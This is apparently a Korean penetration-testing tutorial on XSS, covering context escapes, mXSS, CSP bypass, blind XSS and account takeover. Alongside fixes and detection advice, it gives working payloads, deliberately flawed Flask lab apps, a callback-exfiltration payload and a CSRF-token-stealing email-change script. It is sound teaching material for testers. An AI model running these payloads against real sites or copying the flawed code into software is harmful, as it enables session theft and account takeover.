---
title: 웹 취약점 진단 XSS편 — 문맥 탈출부터 CSP·Blind XSS까지
description: "Reflected·Stored·DOM XSS의 문맥별 탈출부터 필터·mXSS·CSP 우회, Blind XSS와 계정 장악 연계까지 따라 하는 심화 진단 가이드입니다."
tags:
  - 웹보안
  - 취약점진단
  - XSS
  - CSP
  - 클라이언트보안
---

> [!warning] 허가된 환경에서만
> 아래 요청과 페이로드는 **본인이 소유하거나 명시적으로 허가받은 환경**, PortSwigger Web Security Academy, 또는 이 글의 `127.0.0.1` Docker 실습에서만 사용하세요. Blind XSS 수신 주소도 반드시 `127.0.0.1`로 유지합니다.

[[웹 취약점 진단 기법 입문 — XXE, SSRF부터 SQLi, XSS까지]]는 Reflected·Stored·DOM XSS의 기초를, [[웹 취약점 진단 — XSS 페이로드별 사용처와 목적]]은 대표 페이로드 목록과 쓰임을 설명합니다. 이 글은 목록을 되풀이하지 않고 **입력이 어떤 파서를 몇 번 통과하는지, 실제 실행 조건을 어떻게 증명하는지**에 집중합니다.

## 한눈에 보는 기법 요약

| 기법 | 단서 | 성립 조건 | 영향 | 실습 |
|---|---|---|---|---|
| Reflected·Stored·DOM XSS | 검색 결과 반사, 댓글 저장, `location`→DOM sink | 공격자 입력이 실행 가능한 브라우저 문맥에 도달 | 피해자 권한의 JS 실행 | PortSwigger 랩 3개 |
| 문맥별 탈출 | HTML·속성·JS 문자열·URL 안에 입력 표시 | 해당 문맥의 경계를 닫을 문자와 실행 sink가 남음 | 필터 우회, 임의 스크립트 실행 | PortSwigger 문맥 랩 |
| 필터 우회·mXSS | 일부 태그만 차단, 살균 전후 DOM이 다름 | 블랙리스트 누락 또는 재파싱 때 안전 DOM이 변형 | 저장형·DOM XSS | PortSwigger + localhost Docker |
| CSP 우회 | 넓은 스크립트 출처, `<base>` 허용, 재사용 nonce | JSONP·상대 URL·고정 nonce·누락 지시자가 정책과 결합 | CSP를 넘어 코드 실행·정보 유출 | localhost Docker + PortSwigger |
| Blind XSS | 관리자 검수·티켓·로그 뷰어에서 입력 재표시 | 백오피스가 비신뢰 값을 HTML로 렌더링 | 관리자 세션·내부 정보 노출 | localhost Docker 수신 서버 |
| 세션·계정 장악 연계 | XSS가 인증된 화면에서 실행 | 읽을 수 있는 토큰 또는 같은 출처 API 호출 가능 | 세션 탈취, 이메일 변경, 계정 장악 | PortSwigger 랩 2개 |

---

## 1. Reflected·Stored·DOM XSS — 저장 위치가 아니라 실행 경로로 분류하기

### 원리·단서 기능·성립 조건

- **Reflected**: 요청의 검색어·오류값이 바로 응답 HTML에 되돌아옵니다. 링크 전달만으로 피해자 브라우저에서 실행되어야 합니다.
- **Stored**: 댓글·프로필·티켓·파일명처럼 서버에 저장된 값이 나중에 다른 사용자의 응답에 들어갑니다. 저장 성공과 실행 성공은 별개입니다.
- **DOM**: 서버 응답이 안전해 보여도 `location.search`, `location.hash`, `postMessage` 같은 source가 `innerHTML`, `document.write`, `eval`, 위험한 jQuery sink로 흐르면 브라우저 안에서 실행됩니다.

공통 성립 조건은 **공격자 제어 입력 → 실행 가능한 sink → 피해자가 그 경로를 렌더링**하는 세 단계입니다. `alert(1)`이 입력 화면에서만 뜨거나 자기 브라우저 콘솔에서 직접 실행한 결과는 증거가 아닙니다.

### 따라하기 — PortSwigger 랩 3개

1. [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

```http
GET /?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

응답의 검색 결과 안에 `<script>alert(1)</script>`가 그대로 들어가고, 조작한 URL을 새 탭에서 열었을 때 alert가 실행되면 성공입니다.

2. [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

댓글 본문에 `<script>alert(1)</script>`를 저장한 뒤 글을 다시 방문합니다. **새 요청에서도 저장된 값이 응답에 포함되고 실행**되어야 Stored XSS입니다.

3. [Lab: DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

검색 요청을 보낸 뒤 DevTools에서 `document.write` 호출을 찾고 다음처럼 `img` 속성을 닫습니다.

```text
"><svg onload=alert(1)>
```

페이지 원본 응답이 아니라 실행 후 DOM에서 새 `<svg>`가 생기고 alert가 실행되면 성공입니다.

### 진단 체크리스트와 오탐 구분

- [ ] 랜덤 표식으로 반사·저장 위치와 인코딩을 먼저 확인했다.
- [ ] 서버 응답 원문과 실행 후 DOM을 둘 다 보았다.
- [ ] 다른 세션·새 브라우저에서도 실행되는지 확인했다.
- [ ] CSP 콘솔 오류나 Trusted Types가 실행을 막는지 기록했다.
- [ ] HTML 삽입만 되고 JavaScript 실행 경로가 없으면 XSS가 아니라 HTML Injection으로 구분했다.

### 조치

템플릿의 기본 자동 이스케이프를 유지하고, HTML이 필요 없는 값은 `textContent`를 사용합니다. 사용자 HTML이 꼭 필요하면 유지보수되는 sanitizer를 고정된 설정으로 적용하되, 살균 결과를 다시 문자열로 조립하지 않습니다.

```javascript
const result = document.querySelector("#result");
result.textContent = new URLSearchParams(location.search).get("search") ?? "";
```

### 탐지 포인트

응답에서 고위험 문자(`<`, `>`, 따옴표) 반사, 댓글·티켓의 이벤트 속성, 프런트 코드의 source-to-sink 흐름을 연결합니다. CSP 위반 보고는 차단 증거이지 취약점 부재 증거가 아니므로 원 요청과 함께 봅니다.

### 출처

- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

## 2. 문맥별 탈출 — HTML·속성·JavaScript·URL은 서로 다른 언어다

### 원리·단서 기능·성립 조건

같은 입력이라도 `<p>INPUT</p>`, `<input value="INPUT">`, `const q='INPUT'`, `<a href="INPUT">`에서 필요한 경계 문자는 다릅니다. 브라우저는 HTML 토크나이저, JavaScript 파서, URL 파서를 순서대로 사용하므로 **현재 문맥을 닫고 다음 실행 문맥으로 이동**해야 합니다.

| 문맥 | 먼저 확인할 경계 | 실행 조건 |
|---|---|---|
| HTML 본문 | `<`·`>` 인코딩 | 새 실행 태그나 이벤트 요소 생성 |
| 속성값 | 감싼 따옴표와 `>` | 속성을 닫고 이벤트 속성 또는 새 태그 삽입 |
| JavaScript 문자열 | `'`, `"`, 백슬래시, `</script>` | 문자열/스크립트 블록을 닫고 유효한 JS 구성 |
| URL 속성 | 스킴 허용 목록, 클릭 필요 여부 | `javascript:` 등 실행 스킴이 실제 탐색 sink에 도달 |

### 따라하기 — 정확한 랩과 요청

**속성 문맥**: [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

```http
GET /?search=%22onmouseover%3D%22alert(1) HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

응답 요소에 `onmouseover="alert(1)"`가 생성되고 요소 위에 마우스를 올렸을 때 실행되면 성공입니다.

**JavaScript 문자열 문맥**: [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

```text
'-alert(1)-'
```

응답 스크립트가 `var searchTerms = ''-alert(1)-'';` 형태가 되어 문법을 유지하며 실행되는지 확인합니다.

**URL 문맥**: [Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

```text
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript:alert(document.domain)
```

페이지의 Back 링크 `href`가 해당 값으로 바뀐 뒤 **링크 클릭 시** 실행되어야 합니다. 상호작용이 필요한 조건을 보고서에서 숨기지 않습니다.

### 진단 체크리스트와 오탐 구분

- [ ] 입력 앞뒤 30~50자를 응답 원문에서 확보해 문맥을 확정했다.
- [ ] HTML 디코딩 후 JavaScript 파싱처럼 다단계 변환 순서를 기록했다.
- [ ] 클릭·포커스·키 입력 등 필요한 상호작용을 명시했다.
- [ ] 문자열이 DOM에 보이기만 하고 파서 경계를 벗어나지 못하면 오탐으로 분리했다.

### 조치

HTML 본문, 속성, JavaScript, URL마다 전용 인코더를 사용합니다. JavaScript 코드 안에 데이터를 직접 이어 붙이지 말고 JSON 직렬화된 데이터 블록 또는 DOM 속성으로 전달합니다. URL은 파싱 후 `https:`와 명시한 호스트만 허용합니다.

```javascript
const candidate = new URL(rawUrl, location.origin);
if (candidate.protocol !== "https:" || candidate.hostname !== "example.com") {
  throw new Error("blocked URL");
}
link.href = candidate.href;
```

### 탐지 포인트

같은 파라미터가 여러 문맥에 재사용되는지, 템플릿의 raw 출력 연산자, 인라인 이벤트 속성, `javascript:` 탐색을 봅니다. WAF 로그에는 인코딩 전·후 값을 모두 남기되 세션 값은 마스킹합니다.

### 출처

- [PortSwigger — Cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP XSS Prevention Cheat Sheet — Output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding)

---

## 3. 필터 우회와 mXSS — 검사한 문자열과 브라우저가 만든 DOM이 다를 때

### 원리·단서 기능·성립 조건

블랙리스트는 알려진 태그·속성 하나를 놓치면 우회됩니다. mXSS(Mutation XSS)는 한 단계 더 나아가 sanitizer가 안전하다고 본 트리가 **직렬화·재파싱·브라우저 오류 복구 과정에서 다른 DOM으로 변형**될 때 성립합니다. 단순히 난독화 문자열이 통과한 것은 mXSS가 아닙니다.

단서는 `innerHTML`을 여러 번 읽고 쓰는 코드, SVG/MathML과 HTML을 섞는 입력, sanitize 후 다시 템플릿 문자열로 감싸는 처리, 브라우저별 DOM 차이입니다.

### 따라하기 A — 필터 허용면 열거

[Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)에서 Intruder로 태그와 이벤트를 각각 열거합니다. 공식 해법은 허용된 `body`와 `onresize`를 결합합니다.

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
        onload="this.style.width='100px'"></iframe>
```

피해자 상호작용 없이 `print()`가 호출되면 성공입니다. 400과 200의 차이만으로는 성공이 아닙니다.

### 따라하기 B — localhost mXSS 관찰 앱

아래 실습은 실제 서비스용 sanitizer가 아니라, **살균 후 다시 문자열로 합치는 설계가 왜 위험한지** 관찰하는 최소 앱입니다. 빈 폴더에 두 파일을 저장합니다.

`docker-compose.yml`:

```yaml
services:
  app:
    build: .
    ports:
      - "127.0.0.1:5100:5100"
```

`Dockerfile`:

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim
WORKDIR /app
RUN uv pip install --system "flask==3.1.2"
COPY app.py .
CMD ["python", "app.py"]
```

`app.py`:

```python
from flask import Flask, request

app = Flask(__name__)


@app.get("/")
def index() -> str:
    value = request.args.get("value", "<b>hello</b>")
    # Intentionally flawed lab: removes only literal script elements, then reparses HTML.
    value = value.replace("<script>", "").replace("</script>", "")
    return f"""<!doctype html><meta charset=utf-8><title>mutation lab</title>
<p>sanitized string:</p><pre id=raw></pre><div id=out></div>
<script>
const value = {value!r};
raw.textContent = value;
const first = document.createElement('template');
first.innerHTML = value;
out.innerHTML = '<div class=wrapper>' + first.innerHTML + '</div>';
</script>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5100)
```

```bash
docker compose up --build -d
curl -sG 'http://127.0.0.1:5100/' \
  --data-urlencode 'value=<img src=x onerror="document.body.dataset.mxss=&quot;executed&quot;">'
```

브라우저에서 같은 URL을 열고 Console에 `document.body.dataset.mxss`를 입력합니다. `executed`가 나오면, 문자열 필터를 통과한 값이 두 번째 `innerHTML` 재파싱에서 실행 sink가 된 것입니다. 이 최소 예제는 **mutation/reparse 위험을 관찰**하는 것이며, 특정 sanitizer 제품의 우회 판정에는 제품 버전별 공식 회귀 테스트가 추가로 필요합니다.

### 진단 체크리스트와 오탐 구분

- [ ] 필터 전 문자열, 필터 후 문자열, 1차 DOM, 재파싱 DOM을 각각 저장했다.
- [ ] 태그 허용 여부와 이벤트 실행 여부를 분리했다.
- [ ] 최신 브라우저와 실제 배포 sanitizer 버전에서 재현했다.
- [ ] sanitizer가 정상 차단한 CSP 콘솔 메시지만으로 mXSS라 부르지 않았다.

### 조치

블랙리스트 대신 검증된 sanitizer의 최신 버전과 최소 allowlist를 사용합니다. 살균한 DOM을 다시 문자열 결합·재파싱하지 않고 바로 안전한 노드로 삽입합니다. SVG·MathML이 필요 없으면 프로파일에서 제외하고 회귀 페이로드를 테스트에 고정합니다.

### 탐지 포인트

sanitize 호출 직후의 `innerHTML`, `outerHTML`, `insertAdjacentHTML`, DOM 직렬화 경로를 정적 분석합니다. 운영에서는 비정상 SVG/MathML 혼합, 이벤트 속성, 반복되는 인코딩 문자열을 탐지합니다.

### 출처

- [PortSwigger — XSS filter bypass](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [DOMPurify — Security goals and threat model](https://github.com/cure53/DOMPurify/blob/main/SECURITY.md)
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

## 4. CSP 우회 — JSONP·`base-uri`·nonce 재사용·dangling markup

### 원리·단서 기능·성립 조건

CSP는 XSS의 영향 완화 계층이지 출력 인코딩의 대체재가 아닙니다.

- **JSONP**: `script-src`가 신뢰 도메인 전체를 허용하고 그 도메인에 콜백 이름을 제어하는 JSONP가 있으면 허용 출처가 공격자 코드를 감싼 스크립트를 반환할 수 있습니다.
- **`base-uri` 누락**: HTML 주입으로 `<base href>`를 바꾸고 nonce가 붙은 상대 경로 스크립트가 있으면 스크립트 목적지가 공격자 제어 위치로 재해석될 수 있습니다.
- **nonce 재사용·노출**: 고정 nonce, 캐시된 nonce, 공격자 입력에 복사되는 nonce는 비밀이 아닙니다. 같은 응답 안에서 nonce를 알아내어 새 스크립트에 붙일 HTML 주입이 가능하면 우회됩니다.
- **dangling markup**: 스크립트 실행이 막혀도 닫히지 않은 태그·폼으로 뒤따르는 CSRF 토큰 같은 마크업을 공격자 목적지로 전송할 수 있습니다. `form-action`, `base-uri` 누락이 영향을 키웁니다.

### 따라하기 — localhost CSP 관찰

앞 절의 Docker 앱 `app.py`에 다음 라우트를 추가합니다.

```python
from flask import make_response


@app.get("/csp")
def csp() -> object:
    injected = request.args.get("html", "")
    nonce = "reused-lab-nonce"  # intentionally wrong
    body = f"""<!doctype html><meta charset=utf-8><body>
{injected}
<script nonce="{nonce}" src="scripts/app.js"></script>
<form action="/save"><input name="csrf" value="LOCAL-CSRF-TOKEN"></form>"""
    response = make_response(body)
    response.headers["Content-Security-Policy"] = (
        "default-src 'none'; script-src 'nonce-reused-lab-nonce' 'self' "
        "http://127.0.0.1:5100; img-src 'self'; style-src 'self'"
    )
    return response


@app.get("/scripts/app.js")
def script() -> tuple[str, int, dict[str, str]]:
    return "document.body.dataset.csp='legitimate'", 200, {"Content-Type": "application/javascript"}


@app.get("/jsonp")
def jsonp() -> tuple[str, int, dict[str, str]]:
    callback = request.args.get("callback", "show")
    return f"{callback}({{'ok': True}})", 200, {"Content-Type": "application/javascript"}
```

재빌드 후 고정 nonce가 실제로 실행되는지 확인합니다.

```bash
docker compose up --build -d
curl -iG 'http://127.0.0.1:5100/csp' \
  --data-urlencode 'html=<script nonce="reused-lab-nonce">window.cspBypass="executed"</script>'
```

브라우저 Console에서 `window.cspBypass`가 `executed`인지 확인합니다. 정상 스크립트가 설정한 `document.body.dataset.csp`와 별개로, 재사용 nonce를 붙인 주입 스크립트도 실행된 것이 성공 기준입니다. JSONP는 정책에 허용된 출처에서 다음 URL이 JavaScript로 반환되는지 확인합니다.

```bash
curl -sG 'http://127.0.0.1:5100/jsonp' \
  --data-urlencode 'callback=alert'
# 기대: alert({'ok': True})
```

`base-uri` 실습은 `/csp?html=<base href="http://127.0.0.1:5100/">`를 열고 Network에서 상대 URL `scripts/app.js`의 최종 목적지를 확인합니다. 실제 공격 조건은 `<base>`를 공격자 출처로 돌릴 수 있고 그 출처가 CSP에도 허용되는 경우입니다.

**dangling markup 공식 랩**: [Lab: Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack). 공식 exploit server만 사용하고, 주입된 폼이 뒤따르는 CSRF 토큰을 자기 필드로 흡수해 전송하는지 Burp HTTP history로 확인합니다.

### 진단 체크리스트와 오탐 구분

- [ ] `script-src` 허용 출처의 JSONP·업로드·오픈 리다이렉트를 조사했다.
- [ ] nonce가 응답마다 CSPRNG로 새로 생성되고 캐시 키가 안전한지 확인했다.
- [ ] `base-uri 'none'`, `object-src 'none'`, `form-action`이 있는지 확인했다.
- [ ] CSP가 우회되어 **실제 스크립트 실행 또는 토큰 전송**까지 되는지 확인했다.
- [ ] CSP 헤더가 약하다는 사실만으로 XSS 취약점이라 판정하지 않았다.

### 조치

```http
Content-Security-Policy: default-src 'none'; script-src 'nonce-{PER_RESPONSE_RANDOM}' 'strict-dynamic'; base-uri 'none'; object-src 'none'; form-action 'self'; frame-ancestors 'none'
```

nonce는 매 응답마다 예측 불가능하게 생성하고 HTML과 함께 캐시하지 않습니다. 호스트 allowlist를 넓게 두지 말고 JSONP를 폐기하거나 고정 콜백 allowlist와 JSON 응답으로 전환합니다. CSP와 별도로 문맥별 인코딩을 유지합니다.

### 탐지 포인트

CSP Report-Only 보고, `<base>` 삽입, nonce 값 반복, 허용 도메인의 `callback=` 요청, 외부 `form action`을 상관 분석합니다. 보고서에는 차단된 시도와 실제 우회를 구분합니다.

### 출처

- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [PortSwigger — Content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

## 5. Blind XSS — 실행 화면을 볼 수 없을 때 localhost로 콜백 받기

### 원리·단서 기능·성립 조건

고객 문의, 관리자 검수, 로그 대시보드, 주문 메모는 입력자 화면이 아니라 **나중에 백오피스 담당자가 보는 화면**에서 렌더링됩니다. 입력이 저장되고 관리자 UI가 HTML로 출력하며, 관리자 브라우저가 `127.0.0.1` 수신 서버에 접근할 수 있어야 이 실습이 성립합니다.

### 따라하기 — 수신 서버까지 포함한 Docker

앞의 `docker-compose.yml`을 다음처럼 확장합니다.

```yaml
services:
  app:
    build: .
    ports:
      - "127.0.0.1:5100:5100"
  receiver:
    build: .
    command: ["python", "receiver.py"]
    ports:
      - "127.0.0.1:5101:5101"
```

`receiver.py`:

```python
from flask import Flask, jsonify, request

app = Flask(__name__)
events: list[dict[str, str]] = []


@app.get("/collect")
def collect() -> tuple[str, int, dict[str, str]]:
    events.append({"marker": request.args.get("marker", ""), "path": request.args.get("path", "")})
    return "ok", 200, {"Access-Control-Allow-Origin": "*"}


@app.get("/events")
def show_events() -> object:
    return jsonify(events)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5101)
```

`Dockerfile`에 `COPY receiver.py .`를 추가하고, `app.py`에 저장·검수 라우트를 추가합니다.

```python
comments: list[str] = []


@app.post("/blind/submit")
def blind_submit() -> tuple[str, int]:
    comments.append(request.form.get("comment", ""))
    return "stored", 201


@app.get("/blind/review")
def blind_review() -> str:
    return "<!doctype html><meta charset=utf-8>" + "".join(comments)
```

```bash
docker compose up --build -d
curl -X POST 'http://127.0.0.1:5100/blind/submit' \
  --data-urlencode 'comment=<img src=x onerror="fetch(`http://127.0.0.1:5101/collect?marker=blind-xss&path=${encodeURIComponent(location.pathname)}`)">'
```

브라우저에서 `http://127.0.0.1:5100/blind/review`를 한 번 연 뒤 확인합니다.

```bash
curl -s 'http://127.0.0.1:5101/events'
# 기대: marker=blind-xss, path=/blind/review 이벤트 1개 이상
```

성공 기준은 입력 저장이 아니라 **검수 화면을 열었을 때 수신 서버에 고유 marker와 검수 경로가 도착**하는 것입니다. 실무 승인 범위에서도 쿠키·DOM 본문을 수집하지 말고 무해한 고유 표식만 사용합니다.

### 진단 체크리스트와 오탐 구분

- [ ] 어느 역할의 어떤 화면에서 렌더링되는지 사전 승인받았다.
- [ ] 요청마다 고유 marker를 사용했다.
- [ ] 콜백 도메인·수집 필드를 최소화하고 민감정보를 받지 않았다.
- [ ] 이메일 보안 게이트웨이·링크 스캐너의 자동 요청을 관리자 실행과 혼동하지 않았다.

### 조치

백오피스도 공개 화면과 같은 출력 인코딩·sanitizer 정책을 적용하고, 템플릿 raw 출력과 `innerHTML`을 제거합니다. 관리자 UI는 엄격한 CSP와 별도 출처를 사용하고 외부 egress를 제한합니다.

### 탐지 포인트

관리자 화면의 비정상 이미지 오류·외부 fetch, 티켓 필드의 이벤트 속성, CSP 위반 보고를 입력 marker와 연결합니다. 백오피스에서 예상하지 못한 외부 DNS/HTTP 요청도 경보 대상입니다.

### 출처

- [OWASP Web Security Testing Guide — Testing for Stored Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## 6. 세션 탈취와 계정 탈취로 잇기 — `document.cookie`만 보지 않는다

### 원리·단서 기능·성립 조건

`HttpOnly`가 있으면 JavaScript로 세션 쿠키를 읽을 수 없지만 XSS가 무력해지는 것은 아닙니다. 같은 출처 권한으로 CSRF 토큰을 읽고 인증된 API를 호출하거나, 이메일·비밀번호·MFA 복구 설정을 바꿀 수 있습니다. 세션 쿠키가 `HttpOnly`가 아니면 외부 수신점으로 전송하는 고전적 세션 탈취도 가능합니다.

### 따라하기 — PortSwigger 계정 영향 랩

1. [Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)에서 제공된 exploit server/Collaborator만 사용합니다. 댓글 XSS가 피해자 쿠키를 콜백으로 보내고, 그 쿠키로 피해자 세션을 재현했을 때 성공입니다.
2. [Lab: Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)에서 XSS로 계정 페이지를 요청하고 CSRF 토큰을 파싱한 뒤 이메일 변경 요청을 보냅니다. 피해자 이메일이 바뀌어야 성공입니다.

핵심 요청 흐름은 다음과 같습니다.

```javascript
fetch("/my-account")
  .then((response) => response.text())
  .then((html) => {
    const documentCopy = new DOMParser().parseFromString(html, "text/html");
    const token = documentCopy.querySelector('input[name="csrf"]').value;
    return fetch("/my-account/change-email", {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: new URLSearchParams({email: "lab@example.com", csrf: token}),
    });
  });
```

### 진단 체크리스트와 오탐 구분

- [ ] 쿠키의 `HttpOnly`, `Secure`, `SameSite`를 확인했다.
- [ ] 세션 복제와 같은 출처 API 악용을 별도로 평가했다.
- [ ] 이메일 변경 뒤 재인증·알림·기존 세션 폐기가 있는지 확인했다.
- [ ] 단순 alert를 계정 탈취로 과장하지 않고 실제 도달 가능한 민감 동작을 증명했다.

### 조치

XSS 근본 조치에 더해 세션 쿠키에 `HttpOnly; Secure; SameSite=Lax` 이상을 설정합니다. 이메일·비밀번호·MFA 변경에는 현재 비밀번호나 WebAuthn 재인증을 요구하고, 변경 알림과 세션 회수 기능을 둡니다. CSRF 방어는 XSS의 대체재가 아니지만 공격 연쇄의 비용을 높입니다.

### 탐지 포인트

한 세션에서 계정 페이지 조회 직후 이메일·MFA 변경, 평소와 다른 IP/User-Agent의 세션 재사용, DOM에서 토큰을 읽은 직후의 자동 POST를 탐지합니다.

### 출처

- [PortSwigger — Exploiting cross-site scripting vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

## 다음 단계로 이어지는 공격

XSS로 얻은 브라우저 실행 권한은 읽을 수 있는 세션 토큰의 탈취, 같은 출처 API 호출, CSRF 토큰 우회, 관리자 백오피스 접근으로 이어집니다. 계정 이메일·MFA·비밀번호 복구 정보를 바꾸면 지속적인 계정 장악이 되고, Blind XSS가 관리자 화면에서 실행되면 더 높은 권한과 내부 전용 기능으로 공격 경로가 확장됩니다.

> [!success] 실습 검증 범위
> 2026-11-27에 Docker Engine 29.5.2와 Chrome Headless로 localhost 앱을 직접 빌드·실행했습니다. 재파싱 실습의 `dataset.mxss=executed`, 고정 nonce 주입의 `window.cspBypass=executed`와 정상 스크립트 실행, Blind XSS 수신 서버의 `marker=blind-xss`·`path=/blind/review`를 확인했습니다. PortSwigger 랩 URL은 모두 HTTP 200으로 확인했지만 개인 랩 인스턴스를 발급해 풀이를 끝까지 실행하지는 않았습니다.
